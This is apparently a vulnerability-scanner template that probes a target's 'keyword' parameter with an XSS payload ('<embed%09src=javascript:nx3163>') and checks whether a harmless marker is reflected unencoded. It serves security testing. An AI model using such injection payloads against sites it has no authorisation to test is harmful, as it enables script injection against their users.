id: xss3-164
name: 'Raw XSS3 #13 in keyword'
severity: high
type: active
tags:
  - xss
  - injection
  - client
description: 'Unencoded reflection in keyword'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      keyword:
        - '<embed%09src=javascript:nx3163>'
    matchers:
      - type: word
        part: body
        words:
          - 'nx3163'
